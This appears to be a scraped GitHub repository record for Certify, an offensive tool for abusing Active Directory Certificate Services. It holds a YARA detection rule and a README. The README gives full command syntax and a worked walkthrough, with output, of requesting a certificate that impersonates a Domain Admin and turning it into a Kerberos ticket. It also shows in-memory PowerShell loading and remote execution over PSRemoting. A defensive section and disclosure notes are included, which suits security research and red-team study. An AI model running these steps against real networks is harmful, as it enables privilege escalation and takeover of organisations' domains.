{
  "metadata": {
    "timestamp": 1736711039055,
    "page": 778,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjc4MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "GhostPack/Certify",
      "stars": 1558,
      "defaultBranch": "main",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.06640625,
          "content": ".vs\n*.user\n[Dd]ebug/\n[Rr]elease/\n[Bb]in/\n[Oo]bj/\n.DS_Store\nPackages/"
        },
        {
          "name": "CHANGELOG.md",
          "type": "blob",
          "size": 0.4052734375,
          "content": "# Changelog\nAll notable changes to this project will be documented in this file.\n\nThe format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),\nand this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).\n\n\n## [1.1.0] - 2022-11-08\n\n* Added `/sidextension` flag to the `request` command to comply with the upcoming 2023 patch.\n\n## [1.0.0] - 2021-08-04\n\n* Initial release"
        },
        {
          "name": "Certify.sln",
          "type": "blob",
          "size": 1.07421875,
          "content": "ï»¿\nMicrosoft Visual Studio Solution File, Format Version 12.00\n# Visual Studio Version 16\nVisualStudioVersion = 16.0.29009.5\nMinimumVisualStudioVersion = 10.0.40219.1\nProject(\"{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}\") = \"Certify\", \"Certify\\Certify.csproj\", \"{64524CA5-E4D0-41B3-ACC3-3BDBEFD40C97}\"\nEndProject\nGlobal\n\tGlobalSection(SolutionConfigurationPlatforms) = preSolution\n\t\tDebug|Any CPU = Debug|Any CPU\n\t\tRelease|Any CPU = Release|Any CPU\n\tEndGlobalSection\n\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\n\t\t{64524CA5-E4D0-41B3-ACC3-3BDBEFD40C97}.Debug|Any CPU.ActiveCfg = Debug|Any CPU\n\t\t{64524CA5-E4D0-41B3-ACC3-3BDBEFD40C97}.Debug|Any CPU.Build.0 = Debug|Any CPU\n\t\t{64524CA5-E4D0-41B3-ACC3-3BDBEFD40C97}.Release|Any CPU.ActiveCfg = Release|Any CPU\n\t\t{64524CA5-E4D0-41B3-ACC3-3BDBEFD40C97}.Release|Any CPU.Build.0 = Release|Any CPU\n\tEndGlobalSection\n\tGlobalSection(SolutionProperties) = preSolution\n\t\tHideSolutionNode = FALSE\n\tEndGlobalSection\n\tGlobalSection(ExtensibilityGlobals) = postSolution\n\t\tSolutionGuid = {07B108A3-1131-4969-9E7A-B7FD5682E61B}\n\tEndGlobalSection\nEndGlobal\n"
        },
        {
          "name": "Certify.yar",
          "type": "blob",
          "size": 0.3603515625,
          "content": "rule Certify\n{\n    meta:\n        description = \"The TypeLibGUID present in a .NET binary maps directly to the ProjectGuid found in the '.csproj' file of a .NET project.\"\n        author = \"Will Schroeder (@harmj0y)\"\n    strings:\n        $typelibguid = \"64524ca5-e4d0-41b3-acc3-3bdbefd40c97\" ascii nocase wide\n    condition:\n        uint16(0) == 0x5A4D and $typelibguid\n}"
        },
        {
          "name": "Certify",
          "type": "tree",
          "content": null
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.5498046875,
          "content": "Certify is provided under the 3-clause BSD license below.\n\n*************************************************************\n\nCopyright (c) 2021, Will Schroeder and Lee Christensen\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:\n\n    Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\n    Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.\n    The names of its contributors may not be used to endorse or promote products derived from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 23.5908203125,
          "content": "# Certify\n\nCertify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).\n\n[@harmj0y](https://twitter.com/harmj0y) and [@tifkin_](https://twitter.com/tifkin_) are the primary authors of Certify and the the associated AD CS research ([blog](https://posts.specterops.io/certified-pre-owned-d95910965cd2) and [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)).\n\n## Table of Contents\n- [Certify](#certify)\n  - [Usage](#usage)\n    - [Using Requested Certificates](#using-requested-certificates)\n  - [Example Walkthrough](#example-walkthrough)\n  - [Defensive Considerations](#defensive-considerations)\n  - [Compile Instructions](#compile-instructions)\n    - [Sidenote: Running Certify Through PowerShell](#sidenote-running-certify-through-powershell)\n      - [Sidenote Sidenote: Running Certify Over PSRemoting](#sidenote-sidenote-running-certify-over-psremoting)\n  - [Reflections](#reflections)\n  - [Acknowledgments](#acknowledgments)\n\n\n## Usage\n\n    C:\\Tools>Certify.exe\n\n       _____          _   _  __\n      / ____|        | | (_)/ _|\n     | |     ___ _ __| |_ _| |_ _   _\n     | |    / _ \\ '__| __| |  _| | | |\n     | |___|  __/ |  | |_| | | | |_| |\n      \\_____\\___|_|   \\__|_|_|  \\__, |\n                                 __/ |\n                                |___./\n      v1.0.0\n\n\n      Find information about all registered CAs:\n\n        Certify.exe cas [/ca:SERVER\\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]\n\n\n      Find all enabled certificate templates:\n\n        Certify.exe find [/ca:SERVER\\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]\n\n      Find vulnerable/abusable certificate templates using default low-privileged groups:\n\n        Certify.exe find /vulnerable [/ca:SERVER\\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]\n\n      Find vulnerable/abusable certificate templates using all groups the current user context is a part of:\n\n        Certify.exe find /vulnerable /currentuser [/ca:SERVER\\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]\n\n      Find enabled certificate templates where ENROLLEE_SUPPLIES_SUBJECT is enabled:\n\n        Certify.exe find /enrolleeSuppliesSubject [/ca:SERVER\\ca-name| /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]\n\n      Find enabled certificate templates capable of client authentication:\n\n        Certify.exe find /clientauth [/ca:SERVER\\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]\n\n      Find all enabled certificate templates, display all of their permissions, and don't display the banner message:\n\n        Certify.exe find /showAllPermissions /quiet [/ca:COMPUTER\\CA_NAME | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local]\n\n      Find all enabled certificate templates and output to a json file:\n\n        Certify.exe find /json /outfile:C:\\Temp\\out.json [/ca:COMPUTER\\CA_NAME | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local]\n\n\n      Enumerate access control information for PKI objects:\n\n        Certify.exe pkiobjects [/domain:domain.local] [/showAdmins] [/quiet]\n\n\n      Request a new certificate using the current user context:\n\n        Certify.exe request /ca:SERVER\\ca-name [/subject:X] [/template:Y] [/install]\n\n      Request a new certificate using the current machine context:\n\n        Certify.exe request /ca:SERVER\\ca-name /machine [/subject:X] [/template:Y] [/install]\n\n      Request a new certificate using the current user context but for an alternate name (if supported):\n\n        Certify.exe request /ca:SERVER\\ca-name /template:Y /altname:USER\n\n      Request a new certificate using the current user context but for an alternate name and SID (if supported):\n\n        Certify.exe request /ca:SERVER\\ca-name /template:Y /altname:USER /sid:S-1-5-21-2697957641-2271029196-387917394-2136\n\n      Request a new certificate using the current user context but for an alternate name and URL (if supported):\n\n        Certify.exe request /ca:SERVER\\ca-name /template:Y /altname:USER /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-2697957641-2271029196-387917394-2136\n\n      Request a new certificate on behalf of another user, using an enrollment agent certificate:\n\n        Certify.exe request /ca:SERVER\\ca-name /template:Y /onbehalfof:DOMAIN\\USER /enrollcert:C:\\Temp\\enroll.pfx [/enrollcertpw:CERT_PASSWORD]\n\n\n      Download an already requested certificate:\n\n        Certify.exe download /ca:SERVER\\ca-name /id:X [/install] [/machine]\n\n\n\n    Certify completed in 00:00:00.0200190\n\n\n### Using Requested Certificates\n\nCertificates can be transformed to .pfx's usable with Certify with:\n\n    openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\nCertificates can be used with Rubeus to request a TGT with:\n\n    Rubeus.exe asktgt /user:X /certificate:C:\\Temp\\cert.pfx /password:<CERT_PASSWORD>\n\n\n## Example Walkthrough\n\nFirst, use Certify.exe to see if there are any vulnerable templates:\n\n    C:\\Temp>Certify.exe find /vulnerable\n       _____          _   _  __\n      / ____|        | | (_)/ _|\n     | |     ___ _ __| |_ _| |_ _   _\n     | |    / _ \\ '__| __| |  _| | | |\n     | |___|  __/ |  | |_| | | | |_| |\n      \\_____\\___|_|   \\__|_|_|  \\__, |\n                                 __/ |\n                                |___./\n      v1.0.0\n\n    [*] Action: Find certificate templates\n    [*] Using the search base 'CN=Configuration,DC=theshire,DC=local'\n    [*] Restricting to CA name : dc.theshire.local\\theshire-DC-CA\n\n    [*] Listing info about the Enterprise CA 'theshire-DC-CA'\n\n        Enterprise CA Name            : theshire-DC-CA\n        DNS Hostname                  : dc.theshire.local\n        FullName                      : dc.theshire.local\\theshire-DC-CA\n        Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED\n        Cert SubjectName              : CN=theshire-DC-CA, DC=theshire, DC=local\n        Cert Thumbprint               : 187D81530E1ADBB6B8B9B961EAADC1F597E6D6A2\n        Cert Serial                   : 14BFC25F2B6EEDA94404D5A5B0F33E21\n        Cert Start Date               : 1/4/2021 10:48:02 AM\n        Cert End Date                 : 1/4/2026 10:58:02 AM\n        Cert Chain                    : CN=theshire-DC-CA,DC=theshire,DC=local\n        UserSpecifiedSAN              : Disabled\n        CA Permissions                :\n          Owner: BUILTIN\\Administrators        S-1-5-32-544\n\n          Access Rights                                     Principal\n\n          Allow  ManageCA, ManageCertificates               BUILTIN\\Administrators        S-1-5-32-544\n          Allow  ManageCA, ManageCertificates               THESHIRE\\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512\n          Allow  ManageCA, Read, Enroll                     THESHIRE\\Domain Users         S-1-5-21-937929760-3187473010-80948926-513\n            [!] Low-privileged principal has ManageCA rights!\n          Allow  Enroll                                     THESHIRE\\Domain Computers     S-1-5-21-937929760-3187473010-80948926-515\n          Allow  ManageCA, ManageCertificates               THESHIRE\\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519\n          Allow  ManageCertificates, Enroll                 THESHIRE\\certmanager          S-1-5-21-937929760-3187473010-80948926-1605\n          Allow  ManageCA, Enroll                           THESHIRE\\certadmin            S-1-5-21-937929760-3187473010-80948926-1606\n        Enrollment Agent Restrictions :\n          Everyone                      S-1-1-0\n            Template : <All>\n            Targets  :\n              Everyone                  S-1-1-0\n\n          Everyone                      S-1-1-0\n            Template : User\n            Targets  :\n              Everyone                  S-1-1-0\n\n    Vulnerable Certificates Templates :\n\n        CA Name                         : dc.theshire.local\\theshire-DC-CA\n        Template Name                   : User2\n        Validity Period                 : 2 years\n        Renewal Period                  : 6 weeks\n        msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH\n        mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PEND_ALL_REQUESTS, PUBLISH_TO_DS, AUTO_ENROLLMENT\n        Authorized Signatures Required  : 0\n        pkiextendedkeyusage             : Client Authentication, Smart Card Logon\n        Permissions\n          Enrollment Permissions\n            Enrollment Rights           : THESHIRE\\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512\n                                          THESHIRE\\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519\n            All Extended Rights         : THESHIRE\\Domain Users         S-1-5-21-937929760-3187473010-80948926-513\n          Object Control Permissions\n            Owner                       : THESHIRE\\localadmin           S-1-5-21-937929760-3187473010-80948926-1000\n            Full Control Principals     : THESHIRE\\Domain Users         S-1-5-21-937929760-3187473010-80948926-513\n            WriteOwner Principals       : NT AUTHORITY\\Authenticated UsersS-1-5-11\n                                          THESHIRE\\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512\n                                          THESHIRE\\Domain Users         S-1-5-21-937929760-3187473010-80948926-513\n                                          THESHIRE\\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519\n            WriteDacl Principals        : NT AUTHORITY\\Authenticated UsersS-1-5-11\n                                          THESHIRE\\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512\n                                          THESHIRE\\Domain Users         S-1-5-21-937929760-3187473010-80948926-513\n                                          THESHIRE\\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519\n            WriteProperty Principals    : NT AUTHORITY\\Authenticated UsersS-1-5-11\n                                          THESHIRE\\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512\n                                          THESHIRE\\Domain Users         S-1-5-21-937929760-3187473010-80948926-513\n                                          THESHIRE\\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519\n\n        CA Name                         : dc.theshire.local\\theshire-DC-CA\n        Template Name                   : VulnTemplate\n        Validity Period                 : 3 years\n        Renewal Period                  : 6 weeks\n        msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT\n        mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS\n        Authorized Signatures Required  : 0\n        pkiextendedkeyusage             : Client Authentication, Encrypting File System, Secure Email\n        Permissions\n          Enrollment Permissions\n            Enrollment Rights           : THESHIRE\\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512\n                                          THESHIRE\\Domain Users         S-1-5-21-937929760-3187473010-80948926-513\n                                          THESHIRE\\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519\n          Object Control Permissions\n            Owner                       : THESHIRE\\localadmin           S-1-5-21-937929760-3187473010-80948926-1000\n            WriteOwner Principals       : THESHIRE\\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512\n                                          THESHIRE\\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519\n                                          THESHIRE\\localadmin           S-1-5-21-937929760-3187473010-80948926-1000\n            WriteDacl Principals        : THESHIRE\\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512\n                                          THESHIRE\\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519\n                                          THESHIRE\\localadmin           S-1-5-21-937929760-3187473010-80948926-1000\n            WriteProperty Principals    : THESHIRE\\Domain Admins        S-1-5-21-937929760-3187473010-80948926-512\n                                          THESHIRE\\Enterprise Admins    S-1-5-21-937929760-3187473010-80948926-519\n                                          THESHIRE\\localadmin           S-1-5-21-937929760-3187473010-80948926-1000\n\n\n\n    Certify completed in 00:00:00.6548319\n\nGiven the above results, we have the three following issues:\n\n1. `THESHIRE\\Domain Users` have **ManageCA** permissions over the `dc.theshire.local\\theshire-DC-CA` CA (ESC7)\n   * This means that the EDITF_ATTRIBUTESUBJECTALTNAME2 flag can be flipped on the CA by anyone.\n2. `THESHIRE\\Domain Users` have full control over the **User2** template (ESC4)\n   * This means that anyone can flip the **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** flag on this template and remove the **PEND_ALL_REQUESTS** issuance requirement.\n3. `THESHIRE\\Domain Users` can enroll in the **VulnTemplate** template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set (ESC1)\n   * This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA).\n\nWe'll show the abuse of scenario 3.\n\nNext, let's request a new certificate for this template/CA, specifying a DA `localadmin` as the alternate principal:\n\n    C:\\Temp>Certify.exe request /ca:dc.theshire.local\\theshire-DC-CA /template:VulnTemplate /altname:localadmin\n\n       _____          _   _  __\n      / ____|        | | (_)/ _|\n     | |     ___ _ __| |_ _| |_ _   _\n     | |    / _ \\ '__| __| |  _| | | |\n     | |___|  __/ |  | |_| | | | |_| |\n      \\_____\\___|_|   \\__|_|_|  \\__, |\n                                 __/ |\n                                |___./\n      v1.0.0\n\n    [*] Action: Request a Certificates\n\n    [*] Current user context    : THESHIRE\\harmj0y\n    [*] No subject name specified, using current context as subject.\n\n    [*] Template                : VulnTemplate\n    [*] Subject                 : CN=harmj0y, OU=TestOU, DC=theshire, DC=local\n    [*] AltName                 : localadmin\n\n    [*] Certificate Authority   : dc.theshire.local\\theshire-DC-CA\n\n    [*] CA Response             : The certificate had been issued.\n    [*] Request ID              : 337\n\n    [*] cert.pem         :\n\n    -----BEGIN RSA PRIVATE KEY-----\n    MIIEpAIBAAKCAQEAn8bKuwCYj8...\n    -----END RSA PRIVATE KEY-----\n    -----BEGIN CERTIFICATE-----\n    MIIGITCCBQmgAwIBAgITVQAAAV...\n    -----END CERTIFICATE-----\n\n\n    [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n\n\n\n    Certify completed in 00:00:04.2127911\n\n\nCopy the ` -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----` section to a file on Linux/macOS, and run the openssl command to convert it to a .pfx. When prompted, don't enter a password:\n\n    (base) laptop:~ harmj0y$ openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n    Enter Export Password:\n    Verifying - Enter Export Password:\n    (base) laptop:~ harmj0y$\n\n\nFinally, move the cert.pfx to your target machine filesystem (manually or through Cobalt Strike), and request a TGT for the `altname` user using Rubeus:\n\n    C:\\Temp>Rubeus.exe asktgt /user:localadmin /certificate:C:\\Temp\\cert.pfx\n\n       ______        _\n      (_____ \\      | |\n       _____) )_   _| |__  _____ _   _  ___\n      |  __  /| | | |  _ \\| ___ | | | |/___)\n      | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n      |_|   |_|____/|____/|_____)____/(___/\n\n      v1.6.1\n\n    [*] Action: Ask TGT\n\n    [*] Using PKINIT with etype rc4_hmac and subject: CN=harmj0y, OU=TestOU, DC=theshire, DC=local\n    [*] Building AS-REQ (w/ PKINIT preauth) for: 'theshire.local\\localadmin'\n    [+] TGT request successful!\n    [*] base64(ticket.kirbi):\n\n          doIFujCCBbagAwIBBaEDAgEWooIExzCC...(snip)...\n\n      ServiceName           :  krbtgt/theshire.local\n      ServiceRealm          :  THESHIRE.LOCAL\n      UserName              :  localadmin\n      UserRealm             :  THESHIRE.LOCAL\n      StartTime             :  2/22/2021 2:06:51 PM\n      EndTime               :  2/22/2021 3:06:51 PM\n      RenewTill             :  3/1/2021 2:06:51 PM\n      Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n      KeyType               :  rc4_hmac\n      Base64(key)           :  Etb5WPFWeMbsZr2+FQQQMw==\n\n\n## Defensive Considerations\n\nCertify was released at Black Hat 2021 with our [\"Certified Pre-Owned: Abusing Active Directory Certificate Services\"](https://www.blackhat.com/us-21/briefings/schedule/#certified-pre-owned-abusing-active-directory-certificate-services-23168) talk.\n\nThe [TypeRefHash](https://www.gdatasoftware.com/blog/2020/06/36164-introducing-the-typerefhash-trh) of the current Certify codebase is **f9dbbfe2527e1164319350c0b0900c58be57a46c53ffef31699ed116a765995a**.\n\nThe TypeLib GUID of Certify is **64524ca5-e4d0-41b3-acc3-3bdbefd40c97**. This is reflected in the Yara rules currently in this repo.\n\nSee our [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) for prevention and detection guidance.\n\n\n## Compile Instructions\n\nWe are not planning on releasing binaries for Certify, so you will have to compile yourself :)\n\nCertify has been built against .NET 4.0 and is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Simply open up the project .sln, choose \"Release\", and build.\n\n\n### Sidenote: Running Certify Through PowerShell\n\nIf you want to run Certify in-memory through a PowerShell wrapper, first compile the Certify and base64-encode the resulting assembly:\n\n    [Convert]::ToBase64String([IO.File]::ReadAllBytes(\"C:\\Temp\\Certify.exe\")) | Out-File -Encoding ASCII C:\\Temp\\Certify.txt\n\nCertify can then be loaded in a PowerShell script with the following (where \"aa...\" is replaced with the base64-encoded Certify assembly string):\n\n    $CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(\"aa...\"))\n\nThe Main() method and any arguments can then be invoked as follows:\n\n    [Certify.Program]::Main(\"find /vulnerable\".Split())\n\n\n#### Sidenote Sidenote: Running Certify Over PSRemoting\n\nDue to the way PSRemoting handles output, we need to redirect stdout to a string and return that instead. Luckily, Certify has a function to help with that.\n\nIf you follow the instructions in [Sidenote: Running Certify Through PowerShell](#sidenote-running-Certify-through-powershell) to create a Certify.ps1, append something like the following to the script:\n\n    [Certify.Program]::MainString(\"find /vulnerable\")\n\nYou should then be able to run Certify over PSRemoting with something like the following:\n\n    $s = New-PSSession dc.theshire.local\n    Invoke-Command -Session $s -FilePath C:\\Temp\\Certify.ps1\n\nAlternatively, Certify's `/outfile:C:\\FILE.txt` argument will redirect all output streams to the specified file.\n\n\n## Reflections\n\nOn the subject of public disclosure, we self-embargoed the release of our offensive tooling (Certify as well as [ForgeCert](https://github.com/GhostPack/ForgeCert)) for ~45 days after we published our [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) in order to give organizations a chance to get a grip on the issues surrounding Active Directory Certificate Services. We also preemptively released some Yara rules/IOCs for both projects and released the defensive-focused [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) PowerShell project along with the whitepaper. However, we have found that organizations and vendors have historically often not fixed issues or built detections for \"theoretical\" attacks until someone proves something is possible with a proof of concept.\n\n\n## Acknowledgments\n\nCertify used a few resources found online as reference and inspiration:\n\n* [This post](https://web.archive.org/web/20200131060008/http://geekswithblogs.net/shaunxu/archive/2012/01/13/working-with-active-directory-certificate-service-via-c.aspx) on requesting certificates from C#.\n* [This gist](https://gist.github.com/jimmyca15/8f737f5f0bcf347450bd6d6bf34f4f7e#file-certificate-cs-L86-L101) for SAN specification.\n* [This StackOverflow post](https://stackoverflow.com/a/23739932) on exporting private keys.\n* [This PKISolutions post](https://www.sysadmins.lv/blog-en/how-to-convert-pkiexirationperiod-and-pkioverlapperiod-active-directory-attributes.aspx) on converting pkiExpirationPeriod.\n* [This section of MS-CSRA](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-csra/b497b1e1-a84c-40c8-9379-524193176fad) describing enrollment agent security DACLs.\n\n\nThe AD CS work was built on work from a number of others. The [whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) has a complete treatment, but to summarize:\n\n* [Benjamin Delpy](https://twitter.com/gentilkiwi/) for his [extensive work](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files) on smart cards/certificates with Mimikatz and Kekeo.\n* PKI Solutions for their [excellent posts on PKI in Active Directory](https://www.pkisolutions.com/thepkiblog/), as well as their [PSPKI PowerShell module](https://github.com/PKISolutions/PSPKI), which our auditing toolkit is based on.\n* The \"[Windows Server 2008 â PKI and Certificate Security](https://www.microsoftpressstore.com/store/windows-server-2008-pki-and-certificate-security-9780735640788)\" book by Brian Komar.\n* The following open technical specifications provided by Microsoft:\n  * [MS-CERSOD]: Certificate Services Protocols Overview\n  * [MS-CRTD]: Certificate Templates Structure\n  * [MS-CSRA]: Certificate Services Remote Administration Protocol\n  * [MS-ICPR]: ICertPassage Remote Protocol\n  * [MS-WCCE]: Windows Client Certificate Enrollment Protocol\n* [Christoph Falta's GitHub repo](https://github.com/cfalta/PoshADCS) which covers some details on attacking certificate templates, including virtual smart cards as well as some ideas on ACL based abuses.\n* CQURE's \"[The tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)\" post which covers some Subject Alternative Name abuses.\n* Keyfactor's 2016 post \"[Hidden Dangers: Certificate Subject Alternative Names (SANs)](https://www.keyfactor.com/blog/hidden-dangers-certificate-subject-alternative-names-sans/)\"\n* [@Elkement](https://twitter.com/elkement)'s posts \"[Sizzle @ hackthebox â Unintended: Getting a Logon Smartcard for the Domain Admin!](https://elkement.blog/2019/06/01/sizzle-hackthebox-unintended-getting-a-logon-smartcard-for-the-domain-admin-2/)\" and \"[Impersonating a Windows Enterprise Admin with a Certificate: Kerberos PKINIT from Linux](https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/)\" detail certificate template misconfigurations.\n* Carl SÃ¶rqvist wrote up a detailed, and plausible, scenario for how some of these misconfigurations happen titled \"[Supply in the Request Shenanigans](https://blog.qdsecurity.se/2020/09/04/supply-in-the-request-shenanigans/)\".\n* [Ceri Coburn](https://twitter.com/_ethicalchaos_) released an excellent post in 2020 on \"[Attacking Smart Card Based Active Directory Networks](https://ethicalchaos.dev/2020/10/04/attacking-smart-card-based-active-directory-networks/)\" detailing some smart card abuse and Certify additions.\n* Brad Hill published a whitepaper titled \"[Weaknesses and Best Practices of Public Key Kerberos with Smart Cards](https://research.nccgroup.com/wp-content/uploads/2020/07/weaknesses_and_best_practices_of_public_key_kerberos_with_smart_cards.pdf)\" which provided some good background on Kerberos/PKINIT from a security perspective.\n\n"
        }
      ]
    }
  ]
}